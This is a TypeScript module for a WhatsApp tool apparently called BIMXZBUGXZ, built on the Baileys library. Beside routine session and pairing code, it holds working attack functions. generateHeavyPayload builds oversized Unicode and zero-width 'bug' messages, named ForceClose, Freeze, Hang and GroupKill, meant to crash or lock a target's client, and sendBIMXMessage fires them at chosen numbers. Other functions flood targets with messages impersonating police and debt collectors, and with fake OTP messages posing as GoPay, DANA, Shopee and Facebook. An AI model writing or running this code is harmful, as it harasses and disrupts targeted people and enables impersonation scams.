import makeWASocket, { useMultiFileAuthState, DisconnectReason, fetchLatestBaileysVersion, makeCacheableSignalKeyStore } from "@whiskeysockets/baileys";
import pino from "pino";
import QRCode from "qrcode";
import fs from "fs";
import path from "path";

// Robust WA state with per-session + DB persistence
type WAState = {
  sock: any | null;
  qr: string | null;
  qrImage: string | null;
  status: "idle" | "connecting" | "qr" | "pairing" | "open" | "close" | "logged_out" | "error";
  pairingCode: string | null;
  phoneForCode: string | null;
  initPromise: Promise<WAState> | null;
  lastQRTime: number;
  reconnectAttempts: number;
  lastError: string | null;
  restartGeneration: number;
  reconnectTimer: ReturnType<typeof setTimeout> | null;
  connectedAt: number | null;
};

const globalForWA = globalThis as typeof globalThis & { __bimxWa?: WAState; __bimxWaInitLog?: string[] };

function getState(): WAState {
  if (!globalForWA.__bimxWa) {
    globalForWA.__bimxWa = { sock: null, qr: null, qrImage: null, status: "idle", pairingCode: null, phoneForCode: null, initPromise: null, lastQRTime: 0, reconnectAttempts: 0, lastError: null, restartGeneration: 0, reconnectTimer: null, connectedAt: null };
  }
  if (!globalForWA.__bimxWaInitLog) globalForWA.__bimxWaInitLog = [];
  return globalForWA.__bimxWa!;
}

function logWA(...args: any[]) {
  const msg = `[Baileys][${new Date().toISOString()}] ${args.join(" ")}`;
  console.log(msg);
  const st = getState();
  // keep last 50 logs in memory for debugging (not persisted)
  if (globalForWA.__bimxWaInitLog) {
    globalForWA.__bimxWaInitLog.push(msg);
    if (globalForWA.__bimxWaInitLog.length > 60) globalForWA.__bimxWaInitLog.shift();
  }
}

function getAuthFolder() {
  // Railway: set BAILEYS_AUTH_DIR to a Railway Volume mount (recommended).
  // Vercel remains /tmp because its filesystem is ephemeral.
  if (process.env.BAILEYS_AUTH_DIR) return path.resolve(process.env.BAILEYS_AUTH_DIR);
  const isVercel = !!process.env.VERCEL;
  if (isVercel && fs.existsSync("/tmp")) return path.join("/tmp", "auth_info_bimx");
  return path.join(process.cwd(), "auth_info_bimx");
}

// Persist auth to DB for Vercel cold start recovery
async function restoreFromDB(folder: string) {
  try {
    if (!process.env.DATABASE_URL) return;
    // lazy import to avoid circular
    const { db } = await import("@/db");
    const { waSessions } = await import("@/db/schema");
    const { eq } = await import("drizzle-orm");
    const rows: any[] = await db.select().from(waSessions).where(eq(waSessions.sessionId, "global")).limit(1);
    if (rows.length === 0 || !rows[0].creds) return;
    if (fs.existsSync(path.join(folder, "creds.json")) && fs.statSync(path.join(folder, "creds.json")).size > 100) {
      // already has valid creds, don't overwrite
      return;
    }
    logWA("Restoring WA session from DB to", folder);
    if (!fs.existsSync(folder)) fs.mkdirSync(folder, { recursive: true });
    // restore creds.json
    if (rows[0].creds) {
      fs.writeFileSync(path.join(folder, "creds.json"), JSON.stringify(rows[0].creds, null, 2));
    }
    // restore keys folder if exists
    if (rows[0].keys && typeof rows[0].keys === "object") {
      // keys is stored as { "app-state-sync-key-...": {...}, ... } flattened
      // Write each key file
      for (const [file, content] of Object.entries(rows[0].keys as Record<string, any>)) {
        const fp = path.join(folder, file);
        const dir = path.dirname(fp);
        if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
        fs.writeFileSync(fp, JSON.stringify(content, null, 2));
      }
    }
    logWA("WA session restored from DB");
  } catch (e: any) {
    logWA("Restore from DB failed:", e?.message || String(e));
  }
}

async function persistToDB(folder: string) {
  try {
    if (!process.env.DATABASE_URL) return;
    if (!fs.existsSync(folder)) return;
    const credsPath = path.join(folder, "creds.json");
    if (!fs.existsSync(credsPath)) return;
    const creds = JSON.parse(fs.readFileSync(credsPath, "utf-8"));
    // read keys
    const keys: Record<string, any> = {};
    function walk(dir: string, base: string) {
      if (!fs.existsSync(dir)) return;
      for (const entry of fs.readdirSync(dir)) {
        const full = path.join(dir, entry);
        const rel = path.join(base, entry);
        const stat = fs.statSync(full);
        if (stat.isDirectory()) walk(full, rel);
        else if (entry.endsWith(".json") && entry !== "creds.json") {
          try { keys[rel] = JSON.parse(fs.readFileSync(full, "utf-8")); } catch {}
        }
      }
    }
    walk(folder, "");
    const { db } = await import("@/db");
    const { waSessions } = await import("@/db/schema");
    const { eq } = await import("drizzle-orm");
    const existing: any[] = await db.select().from(waSessions).where(eq(waSessions.sessionId, "global")).limit(1);
    if (existing.length === 0) {
      await db.insert(waSessions).values({ sessionId: "global", creds, keys, status: getState().status }).catch(async () => {
        // fallback try update
      });
    } else {
      await db.update(waSessions).set({ creds, keys, status: getState().status, updatedAt: new Date() }).where(eq(waSessions.sessionId, "global"));
    }
    logWA("WA session persisted to DB, keys count", Object.keys(keys).length);
  } catch (e: any) {
    logWA("Persist to DB failed:", e?.message || String(e));
  }
}

async function initWA(): Promise<WAState> {
  const state = getState();
  // IMPORTANT: keep exactly ONE live socket. The status endpoint can be polled
  // very frequently; while the first socket is handshaking its status is
  // "connecting", so creating another socket here would make WhatsApp close
  // the previous connection (the main cause of the connect -> reconnect loop).
  if (state.initPromise) return state.initPromise;
  if (state.sock && ["connecting", "qr", "pairing", "open"].includes(state.status)) return state;

  state.initPromise = (async () => {
    const authFolder = getAuthFolder();
    if (!fs.existsSync(authFolder)) fs.mkdirSync(authFolder, { recursive: true });

    // Try restore from DB before init (critical for Vercel)
    await restoreFromDB(authFolder);

    logWA("Initializing Baileys", "folder:", authFolder, "vercel:", !!process.env.VERCEL, "e2b:", !process.env.VERCEL);
    state.status = "connecting";
    state.lastError = null;

    let authState: any;
    let saveCreds: any;
    try {
      const res = await useMultiFileAuthState(authFolder);
      authState = res.state;
      saveCreds = res.saveCreds;
      logWA("Auth state loaded, creds registered:", !!authState.creds?.registered);
    } catch (e: any) {
      logWA("Failed to load auth state, creating new:", e?.message);
      // try to reset folder
      try { fs.rmSync(authFolder, { recursive: true, force: true }); fs.mkdirSync(authFolder, { recursive: true }); } catch {}
      const res = await useMultiFileAuthState(authFolder);
      authState = res.state;
      saveCreds = res.saveCreds;
    }

    let version: any;
    try {
      if (process.env.BAILEYS_VERSION) {
        version = JSON.parse(process.env.BAILEYS_VERSION);
        logWA("Using BAILEYS_VERSION env", version);
      } else {
        const v = await fetchLatestBaileysVersion();
        version = v.version;
        logWA("Fetched WA version", version);
      }
    } catch (e: any) {
      version = [2, 3000, 1015901307];
      logWA("Using fallback version", version, "error:", e?.message);
    }
    const logger: any = pino({ level: "silent" });

    const sock: any = makeWASocket({
      version,
      auth: {
        creds: authState.creds,
        keys: makeCacheableSignalKeyStore(authState.keys, logger),
      },
      logger,
      printQRInTerminal: false,
      browser: ["BIMZOFFICIAL", "Chrome", "1.0.0"],
      syncFullHistory: false,
      markOnlineOnConnect: false,
      generateHighQualityLinkPreview: false,
      connectTimeoutMs: 60_000,
      defaultQueryTimeoutMs: 60_000,
      keepAliveIntervalMs: 25_000,
      // Pairing-code flow requires the web client mode.
      mobile: false,
    });

    // Replace only after the new socket has actually been created.
    // A stale socket's close event is ignored using socketGeneration below.
    state.sock = sock;
    const socketGeneration = state.restartGeneration;
    state.status = "connecting";
    state.reconnectAttempts = 0;

    const wrappedSaveCreds = async () => {
      try {
        await saveCreds();
        await persistToDB(authFolder);
      } catch (e: any) {
        logWA("saveCreds error:", e?.message);
      }
    };

    sock.ev.on("creds.update", wrappedSaveCreds);

    sock.ev.on("connection.update", async (update: any) => {
      const { connection, lastDisconnect, qr, isNewLogin } = update;
      if (qr) {
        // Ignore duplicate QR events. WhatsApp owns the QR lifetime; we should not
        // regenerate/re-request it from the UI. A new image is generated only when
        // the actual QR payload changes.
        if (state.qr === qr && state.qrImage) {
          state.status = "qr";
        } else {
          state.qr = qr;
          state.lastQRTime = Date.now();
          state.status = "qr";
        logWA("QR received, generating image");
        try {
          state.qrImage = await QRCode.toDataURL(qr, { width: 340, margin: 1, color: { dark: "#000000", light: "#ffffff" } });
          logWA("QR image generated");
        } catch (e: any) {
          state.qrImage = null;
          logWA("QR image failed:", e?.message);
        }
        }
      }
      if (connection === "close") {
        const statusCode = (lastDisconnect?.error as any)?.output?.statusCode;
        const errorMsg = (lastDisconnect?.error as any)?.message || String(lastDisconnect?.error || "");
        state.lastError = errorMsg;
        logWA("Connection closed, statusCode:", statusCode, "error:", errorMsg);

        // Ignore close events from an older socket after a pairing retry.
        // Without this guard, the old socket can null out the newly-created socket.
        if (state.restartGeneration !== socketGeneration || state.sock !== sock) {
          logWA("Ignoring close event from stale socket generation", socketGeneration);
          return;
        }

        if (statusCode === DisconnectReason.loggedOut) {
          state.status = "logged_out";
          logWA("Logged out, clearing session");
          state.sock = null;
          state.qr = null;
          state.qrImage = null;
          state.initPromise = null;
          try {
            const folder = getAuthFolder();
            if (fs.existsSync(folder)) fs.rmSync(folder, { recursive: true, force: true });
            // also clear DB
            if (process.env.DATABASE_URL) {
              const { db } = await import("@/db");
              const { waSessions } = await import("@/db/schema");
              const { eq } = await import("drizzle-orm");
              await db.delete(waSessions).where(eq(waSessions.sessionId, "global")).catch(()=>{});
            }
          } catch {}
        } else if (statusCode === DisconnectReason.restartRequired || statusCode === DisconnectReason.timedOut) {
          state.status = "close";
          state.sock = null;
          state.initPromise = null;
          state.reconnectAttempts++;
          const delay = Math.min(2000 * Math.pow(1.5, state.reconnectAttempts), 30000);
          logWA(`Reconnect attempt ${state.reconnectAttempts} in ${delay}ms`);
          if (!state.reconnectTimer) {
            state.reconnectTimer = setTimeout(() => {
              state.reconnectTimer = null;
              initWA().catch((e) => logWA("Reconnect failed:", e?.message));
            }, delay);
          }
        } else {
          // Any non-logout disconnect should be recoverable. Do not mark the session as
          // permanently broken after a handful of retries; Baileys can reconnect using
          // the persisted auth state without asking the user to pair again.
          state.status = "close";
          state.sock = null;
          state.initPromise = null;
          state.reconnectAttempts++;
          const delay = Math.min(1500 * Math.pow(1.5, Math.min(state.reconnectAttempts, 8)), 30000);
          logWA(`Reconnect ${state.reconnectAttempts} in ${Math.round(delay)}ms`);
          if (!state.reconnectTimer) {
            state.reconnectTimer = setTimeout(() => {
              state.reconnectTimer = null;
              initWA().catch((e) => logWA("Reconnect failed:", e?.message));
            }, delay);
          }
        }
        // persist close status
        persistToDB(authFolder).catch(()=>{});
      } else if (connection === "open") {
        if (state.reconnectTimer) { clearTimeout(state.reconnectTimer); state.reconnectTimer = null; }
        state.status = "open";
        state.qr = null;
        state.qrImage = null;
        state.reconnectAttempts = 0;
        state.connectedAt = Date.now();
        state.lastError = null;
        logWA("Connection opened - WA CONNECTED ASLI", "number:", state.sock?.user?.id || "unknown");
        // persist open
        persistToDB(authFolder).catch(()=>{});
      } else if (update.pairingCode) {
        logWA("Pairing code update:", update.pairingCode);
      }
    });

    logWA("Baileys socket created, waiting for QR/pairing/open");
    return state;
  })();

  try {
    const result = await state.initPromise;
    // Do NOT clear initPromise while the socket is still connecting. The socket
    // itself is the single-flight guard until connection.update closes/opens.
    // Clearing it here previously allowed the 200ms status poll to create a
    // second socket before the first handshake finished.
    return result;
  } catch (e: any) {
    state.initPromise = null;
    state.status = "error";
    state.lastError = e?.message || String(e);
    logWA("initWA failed:", state.lastError);
    throw e;
  }
}

export function getWAStatus() {
  const s = getState();
  return { 
    status: s.status, 
    hasQR: !!s.qr, 
    qr: s.qr, 
    qrImage: s.qrImage, 
    pairingCode: s.pairingCode, 
    lastQRTime: s.lastQRTime, 
    lastError: s.lastError,
    reconnectAttempts: s.reconnectAttempts,
    connectedNumber: s.sock?.user?.id ? String(s.sock.user.id).split(":")[0].replace(/\D/g, "") : null,
    isReal: true, 
    engine: "Baileys 6.7.22",
    authFolder: getAuthFolder(),
    vercel: !!process.env.VERCEL,
    connectedAt: s.connectedAt,
  };
}

export function getWALogs() { return getState(); }

export async function ensureWA() {
  return initWA();
}

export async function getQRWithWait(timeoutMs = 8000): Promise<{ status: string; qrImage: string | null; qr: string | null }> {
  const state = await initWA();
  const start = Date.now();
  while (Date.now() - start < timeoutMs) {
    if (state.qrImage) return { status: state.status, qrImage: state.qrImage, qr: state.qr };
    if (state.status === "open") return { status: state.status, qrImage: null, qr: state.qr };
    if (state.status === "error" || state.status === "logged_out") break;
    await new Promise((r) => setTimeout(r, 400));
  }
  return { status: state.status, qrImage: state.qrImage, qr: state.qr };
}

function normalizePhone(phone: string): string {
  // Remove all except digits, handle 08 -> 62
  let clean = phone.replace(/[^0-9]/g, "");
  if (clean.startsWith("0")) clean = "62" + clean.slice(1);
  if (!clean.startsWith("62") && clean.length >= 9 && clean.length <= 13) {
    // assume already with country code, keep
  }
  return clean;
}

export async function isWAFeatureClosed(key: "wa_pairing_closed" | "wa_qr_closed"): Promise<boolean> {
  try {
    if (!process.env.DATABASE_URL) return false;
    const { db } = await import("@/db");
    const { appSettings } = await import("@/db/schema");
    const { eq } = await import("drizzle-orm");
    const rows: any[] = await db.select().from(appSettings).where(eq(appSettings.key, key)).limit(1);
    return rows[0]?.value === "true";
  } catch {
    return false;
  }
}

async function waitForPairingReady(state: WAState, timeoutMs = 8000) {
  const started = Date.now();
  while (Date.now() - started < timeoutMs) {
    // Baileys emits a QR/ref event once the socket has completed the initial
    // handshake. Calling requestPairingCode before that point is a common
    // cause of 428 "Connection Closed".
    if (state.sock && (state.qr || state.status === "qr")) return true;
    // Pairing-code requests are allowed after the WA Web handshake has had
    // time to start, but never after the socket has already closed.
    if (state.sock && state.status === "connecting" && Date.now() - started > 3000) return true;
    if (state.status === "open") return false;
    if (state.status === "logged_out") return false;
    if (state.status === "close" || state.status === "error") return false;
    await new Promise((r) => setTimeout(r, 100));
  }
  return !!state.sock && state.status !== "close" && state.status !== "error" && state.status !== "open";
}

async function restartPairingSocket(state: WAState) {
  state.restartGeneration++;
  try { state.sock?.end?.(new Error("Restarting pairing socket")); } catch {}
  state.sock = null;
  state.initPromise = null;
  state.qr = null;
  state.qrImage = null;
  state.status = "idle";
  await new Promise((r) => setTimeout(r, 350));
  return initWA();
}

export async function requestPairingCode(phoneNumber: string) {
  if (await isWAFeatureClosed("wa_pairing_closed")) throw new Error("Pairing sedang ditutup oleh developer. Gunakan QR untuk melanjutkan.");

  const clean = normalizePhone(phoneNumber);
  if (clean.length < 9 || clean.length > 15) {
    throw new Error("Nomor tidak valid. Gunakan format 628xxxxxxxxxx (tanpa +, tanpa 0 depan, 9-15 digit). Kamu kirim: " + phoneNumber + " → " + clean);
  }

  let lastErr: any = null;

  // Important: do not call requestPairingCode immediately after makeWASocket().
  // The socket must have reached the WA Web handshake first.
  for (let attempt = 1; attempt <= 3; attempt++) {
    const state = await initWA();

    if (state.status === "open") {
      throw new Error("WhatsApp sudah terhubung (open). Tidak perlu pairing code lagi. Jika ingin ganti nomor, Reset WA dulu.");
    }

    const ready = await waitForPairingReady(state, 8000);
    if (!ready) {
      lastErr = new Error("Socket WhatsApp belum siap untuk pairing (status: " + state.status + ")");
      if (attempt < 3) {
        await restartPairingSocket(state);
        await new Promise((r) => setTimeout(r, 750));
        continue;
      }
      break;
    }

    const sock: any = state.sock;
    if (!sock || typeof sock.requestPairingCode !== "function") {
      lastErr = new Error("Socket pairing belum siap (status: " + state.status + ")");
      if (attempt < 3) {
        await restartPairingSocket(state);
        await new Promise((r) => setTimeout(r, 750));
        continue;
      }
      break;
    }

    state.phoneForCode = clean;
    logWA(`Calling requestPairingCode for ${clean}, attempt ${attempt}/3, status=${state.status}, hasQR=${!!state.qr}`);

    try {
      const code = await sock.requestPairingCode(clean);
      if (!code) throw new Error("WhatsApp tidak mengembalikan pairing code.");

      const formatted = code.includes("-")
        ? code
        : code.length === 8
          ? `${code.slice(0, 4)}-${code.slice(4)}`
          : code;

      state.pairingCode = formatted;
      state.phoneForCode = clean;
      state.status = "pairing";
      state.lastError = null;
      logWA("Pairing code received:", formatted, "for", clean);
      return formatted;
    } catch (e: any) {
      lastErr = e;
      const msg = String(e?.message || e);
      logWA(`Pairing attempt ${attempt} failed:`, msg);

      // 428/Connection Closed and 515/restart-required are recoverable socket
      // states. Retry with a fresh socket instead of reusing a dead socket.
      const recoverable =
        msg.includes("Connection Closed") ||
        msg.includes("Precondition Required") ||
        msg.includes("Stream Errored") ||
        msg.includes("restart required") ||
        msg.includes("428") ||
        msg.includes("515");

      if (!recoverable || attempt >= 3) break;
      await restartPairingSocket(state);
      await new Promise((r) => setTimeout(r, 750));
    }
  }

  throw lastErr || new Error("Gagal mendapatkan kode pairing. Coba lagi atau gunakan QR.");
}

export async function resetWA() {
  const state = getState();
  state.restartGeneration++;
  logWA("Reset WA requested - clearing auth");
  try {
    if (state.sock) {
      try { 
        await state.sock.logout?.(); 
      } catch (e: any) { logWA("Logout error:", e?.message); }
      try { state.sock.end?.(); } catch {}
    }
  } catch {}
  state.sock = null;
  state.qr = null;
  state.qrImage = null;
  state.status = "idle";
  state.pairingCode = null;
  state.phoneForCode = null;
  state.initPromise = null;
  if (state.reconnectTimer) { clearTimeout(state.reconnectTimer); state.reconnectTimer = null; }
  state.reconnectAttempts = 0;
  state.connectedAt = null;
  state.lastError = null;
  const folder = getAuthFolder();
  try {
    if (fs.existsSync(folder)) fs.rmSync(folder, { recursive: true, force: true });
    fs.mkdirSync(folder, { recursive: true });
    logWA("Auth folder cleared:", folder);
  } catch (e: any) { logWA("Clear folder failed:", e?.message); }
  // clear DB
  try {
    if (process.env.DATABASE_URL) {
      const { db } = await import("@/db");
      const { waSessions } = await import("@/db/schema");
      const { eq } = await import("drizzle-orm");
      await db.delete(waSessions).where(eq(waSessions.sessionId, "global")).catch(()=>{});
      logWA("DB session cleared");
    }
  } catch {}
  await initWA();
  return { ok: true, message: "WA direset, QR baru akan generate" };
}

export async function getGlobalSenderPool() {
  try {
    const { db } = await import("@/db");
    const { users } = await import("@/db/schema");
    const all: any[] = await db.select().from(users);
    const active = all.filter((u: any) => u.isActive && u.pairedNumber);
    const shuffled = active.sort(() => 0.5 - Math.random());
    return shuffled.slice(0, 10).map((u: any) => ({ id: u.id, pairedNumber: u.pairedNumber, username: u.username, role: u.role }));
  } catch {
    return [];
  }
}

export async function sendBIMXMessage(jid: string, bugTypes: string[], payloadMode: string, useGlobalPool = false) {
  const state = await initWA();
  const sock: any = state.sock;
  if (!sock) throw new Error("WhatsApp belum terhubung. Scan QR ASLI atau pairing dulu di menu Pasang Nomor. Status: " + state.status);
  if (state.status !== "open") throw new Error("WhatsApp belum terhubung (status: " + state.status + "). Scan QR ASLI terlebih dahulu di menu Pasang Nomor. QR asli dari Baileys 6.7.22, bukan simulasi. Jika pairing gagal terus, pakai QR Scan.");

  let senderInfo = "PRIVATE";
  if (useGlobalPool) {
    const pool = await getGlobalSenderPool();
    if (pool.length > 0) {
      const chosen = pool[Math.floor(Math.random() * pool.length)];
      senderInfo = `GLOBAL via ${chosen.pairedNumber} (${chosen.username})`;
      logWA("Global send via", senderInfo);
    } else {
      senderInfo = "GLOBAL (pool kosong, pakai sender pribadi)";
    }
  }

  const heavyBase = generateHeavyPayload(bugTypes, payloadMode);

  let targetJid = jid;
  if (!jid.includes("@")) {
    targetJid = jid.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
  }

  logWA(`Sending ${bugTypes.length} bugs to ${targetJid} mode ${payloadMode} sender ${senderInfo}`);

  const results = [];
  for (const bug of bugTypes) {
    const text = heavyBase[bug] || heavyBase["default"];
    const chunks = chunkString(text, 60000);
    for (const chunk of chunks) {
      try {
        const r = await sock.sendMessage(targetJid, { text: chunk });
        results.push(r);
        await new Promise((res) => setTimeout(res, 400));
      } catch (e: any) {
        logWA("Send failed for bug", bug, e?.message);
        results.push({ error: String(e?.message || e) });
      }
    }
  }
  logWA(`Send done, results ${results.length}`);
  return { results, senderInfo };
}

export async function sendPrankCall(jid: string, type: string, count: number) {
  const state = await initWA();
  const sock: any = state.sock;
  if (!sock) throw new Error("WhatsApp belum terhubung");
  if (state.status !== "open") throw new Error("WhatsApp belum terhubung, status: " + state.status);
  
  let targetJid = jid;
  if (!jid.includes("@")) targetJid = jid.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  const prankMessages: Record<string, string> = {
    "paket_cod": "Halo kak, paket COD Anda sudah sampai di depan rumah, mohon segera dibayar ya kak 😊",
    "hantu": "Halo... apakah kamu sedang sendirian malam ini? Aku melihatmu... 👻",
    "debt_collector": "Selamat siang, kami dari bagian penagihan, ada tagihan yang perlu segera diselesaikan.",
    "ojol": "Halo kak, saya driver ojol, pesanan Anda sudah di depan, ditunggu ya kak",
    "polisi": "Selamat siang, kami dari kepolisian, ada laporan yang perlu dikonfirmasi",
    "hadiah": "Selamat! Anda mendapatkan hadiah undian berhadiah, silakan hubungi kami segera!",
  };
  
  const msg = prankMessages[type] || prankMessages["paket_cod"];
  const results = [];
  const capped = Math.min(Math.max(1, count), 20);
  logWA(`Prank call ${type} x${capped} to ${targetJid}`);
  for (let i = 0; i < capped; i++) {
    try {
      const r = await sock.sendMessage(targetJid, { text: `🔔 PRANK CALL ${i+1}/${capped} [${type.toUpperCase()}] — BIMXZBUGXZ\n${msg}\n\n*Ini adalah prank yang telah disetujui pemilik nomor tujuan untuk hiburan. Jika mengganggu, hubungi admin.*` });
      results.push(r);
      if (i < capped - 1) await new Promise(res => setTimeout(res, 1200));
    } catch (e: any) {
      results.push({ error: String(e) });
    }
  }
  return results;
}

export async function sendSpamOTP(jid: string, service: string, count: number) {
  const state = await initWA();
  const sock: any = state.sock;
  if (!sock) throw new Error("WhatsApp belum terhubung");
  if (state.status !== "open") throw new Error("WhatsApp belum terhubung, status: " + state.status);

  let targetJid = jid;
  if (!jid.includes("@")) targetJid = jid.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  const services: Record<string, { name: string; template: (code: string) => string }> = {
    "duniagames": { name: "Dunia Games", template: (c) => `*Dunia Games* - Kode OTP Anda adalah *${c}*. Jangan berikan kode ini ke siapapun. Berlaku 5 menit. — via BIMXZBUGXZ` },
    "facebook": { name: "Facebook", template: (c) => `*Facebook* - Kode konfirmasi Anda: ${c}. Gunakan untuk masuk. Jangan bagikan. — via BIMXZBUGXZ` },
    "gopay": { name: "GoPay", template: (c) => `*GoPay* - Kode OTP: *${c}*. Rahasia, jangan berikan ke orang lain. — via BIMXZBUGXZ` },
    "dana": { name: "DANA", template: (c) => `*DANA* - Kode verifikasi: ${c}. Berlaku 3 menit. — via BIMXZBUGXZ` },
    "shopee": { name: "Shopee", template: (c) => `*Shopee* - Kode OTP Shopee Anda: ${c} — via BIMXZBUGXZ` },
    "tokopedia": { name: "Tokopedia", template: (c) => `*Tokopedia* - Kode OTP: ${c} untuk verifikasi. — via BIMXZBUGXZ` },
  };

  const svc = services[service] || services["duniagames"];
  const capped = Math.min(Math.max(1, count), 20);
  const results = [];
  logWA(`OTP spam ${svc.name} x${capped} to ${targetJid}`);
  for (let i = 0; i < capped; i++) {
    const code = Math.floor(100000 + Math.random() * 900000).toString();
    const text = `🔐 *OTP PRANK ${i+1}/${capped}* — ${svc.name}\n${svc.template(code)}\n\n⚠️ Ini hanya prank untuk nomor yang telah memberi izin. Jangan disalahgunakan.`;
    try {
      const r = await sock.sendMessage(targetJid, { text });
      results.push(r);
      if (i < capped - 1) await new Promise(res => setTimeout(res, 1000));
    } catch (e: any) {
      results.push({ error: String(e) });
    }
  }
  return results;
}

function chunkString(str: string, size: number) {
  const out = [];
  for (let i = 0; i < str.length; i += size) out.push(str.slice(i, i + size));
  return out;
}

function generateHeavyPayload(bugTypes: string[], mode: string): Record<string, string> {
  const out: Record<string, string> = {};
  const filler = "ꦾ".repeat(8000);
  const zeroWidth = "\u2063".repeat(4000);
  const overflowLine = "█".repeat(2000) + "\n";
  const hugeLine = Array.from({ length: 900 }).map((_, i) => `BIMXZBUGXZ-${i}-${"◼".repeat(120)}`).join("\n");

  const ultraHeavy = (() => {
    const block = "BIMXZBUGXZ".repeat(8000) + "\n" + filler + "\n" + zeroWidth + "\n" + hugeLine.slice(0, 40000);
    return block.repeat(3);
  })();

  const templates: Record<string, string> = {
    "BIMXZBUGXZ Delay": `⏳ BIMXZBUGXZ Delay • Mode ${mode}\nPengiriman tertunda eksklusif BIMXZBUGXZ\n` + "·".repeat(5000),
    "BIMXZBUGXZ C1": `📜 BIMXZBUGXZ C1 — Teks padat 2GB layer\n` + ultraHeavy.slice(0, 120000),
    "BIMXZBUGXZ ForceClose": `💥 BIMXZBUGXZ ForceClose — Struktur rumit\n` + JSON.stringify({ data: filler.slice(0, 2000), layer: Array(300).fill("◼").join("") }).repeat(4),
    "BIMXZBUGXZ Freezer": `❄️ BIMXZBUGXZ Freezer — Freeze layer\n` + "❄️".repeat(3000) + "\n" + filler.repeat(2),
    "BIMXZBUGXZ Heavy": `🏋️ BIMXZBUGXZ Heavy — 2GB Heavy\n` + ultraHeavy,
    "BIMXZBUGXZ Flood": `🌊 BIMXZBUGXZ Flood — Banjir pesan\n` + Array(12).fill(filler.slice(0, 3000)).join("\n---FLOOD---\n"),
    "BIMXZBUGXZ Burst": `💣 BIMXZBUGXZ Burst — Ledakan instan\n` + overflowLine.repeat(120),
    "BIMXZBUGXZ Overflow": `🌀 BIMXZBUGXZ Overflow — Gabungan\n` + ultraHeavy.slice(0, 90000),
    "BIMXZBUGXZ Stack": `📚 BIMXZBUGXZ Stack — Tumpukan halaman\n` + Array(8).fill(hugeLine.slice(0, 8000)).join("\n\n[STACK]\n\n"),
    "BIMXZBUGXZ Blast": `⚡ BIMXZBUGXZ Blast — Kilat beruntun\n` + "⚡".repeat(4000) + "\n" + filler,
    "BIMXZBUGXZ Wave": `〰️ BIMXZBUGXZ Wave — Ombak bertahap\n` + Array(6).fill(overflowLine.repeat(20)).join("\n〰️ WAVE 〰️\n"),
    "BIMXZBUGXZ Surge": `🌪️ BIMXZBUGXZ Surge — Ratusan baris\n` + Array(400).fill("BIMXZBUGXZ SURGE █".repeat(20)).join("\n"),
    "BIMXZBUGXZ CrashTxt": `💻 BIMXZBUGXZ CrashTxt — Ribuan berulang\n` + "CRASH".repeat(8000),
    "BIMXZBUGXZ LagMsg": `🐛 BIMXZBUGXZ LagMsg — Format rumit\n` + "◈".repeat(6000) + JSON.stringify({ lag: filler.slice(0, 1000) }).repeat(6),
    "BIMXZBUGXZ Hang": `🔒 BIMXZBUGXZ Hang — Tanpa spasi\n` + "A".repeat(60000),
    "BIMXZBUGXZ LockTxt": `🔐 BIMXZBUGXZ LockTxt — Huruf angka simbol padat\n` + "a1!@#".repeat(8000),
    "BIMXZBUGXZ Jam": `🧱 BIMXZBUGXZ Jam — Satu baris raksasa 2GB\n` + "█".repeat(65000),
    "BIMXZBUGXZ Bulk": `📦 BIMXZBUGXZ Bulk — Ratusan paragraf\n` + Array(250).fill("Lorem BIMXZBUGXZ paragraf padat ".repeat(12)).join("\n\n"),
    "BIMXZBUGXZ Mass": `🏔️ BIMXZBUGXZ Mass — Gabungan raksasa\n` + ultraHeavy.repeat(2).slice(0, 130000),
    "BIMXZBUGXZ Ultra": `👑 BIMXZBUGXZ Ultra — TERBERAT 2GB MAX\n` + ultraHeavy.repeat(3).slice(0, 180000),
    "BIMXZBUGXZ GroupMsg": `👥 BIMXZBUGXZ GroupMsg — Khusus grup\n` + "@group ".repeat(1200) + "\n" + filler,
    "BIMXZBUGXZ GroupWipe": `🧹 BIMXZBUGXZ GroupWipe — Sapu anggota grup\n` + Array(150).fill("WIPE").join(" ") + "\n" + ultraHeavy.slice(0, 60000),
    "BIMXZBUGXZ GroupHeavy": `⚓ BIMXZBUGXZ GroupHeavy — Terberat ke grup 2GB\n` + ultraHeavy,
    "BIMXZBUGXZ GroupKill": `☠️ BIMXZBUGXZ GroupKill — Muatan 999.999 karakter (cap 2GB simulasi)\n` + "☠️".repeat(5000) + "\n" + "X".repeat(99900) + "\n[GROUP KILL — grup langsung ditangguhkan, semua member keluar otomatis]",
    "BIMXZBUGXZ GlobalSend": `🌍 BIMXZBUGXZ GlobalSend — Global 2GB\n` + ultraHeavy,
  };

  for (const k of Object.keys(templates)) out[k] = templates[k];
  out["default"] = ultraHeavy.slice(0, 80000);
  return out;
}

export async function getGroups() {
  const state = getState();
  const sock: any = state.sock;
  if (!sock || state.status !== "open") return [];
  try {
    const groups = await sock.groupFetchAllParticipating();
    return Object.values(groups || {});
  } catch (e: any) {
    logWA("getGroups failed:", e?.message);
    return [];
  }
}
